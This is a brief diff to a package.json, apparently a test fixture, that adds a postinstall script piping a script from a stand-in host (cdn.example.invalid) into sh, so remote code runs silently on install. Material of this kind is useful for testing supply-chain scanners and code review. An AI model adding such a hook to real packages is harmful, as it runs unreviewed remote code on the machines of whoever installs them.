@@ -2,6 +2,9 @@
   "name": "fixture-gatsby-api",
   "private": true,
   "type": "module",
+  "scripts": {
+    "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
+  },
   "dependencies": {
     "axios": "^1.7.0",
     "gatsby": "^5.0.0",
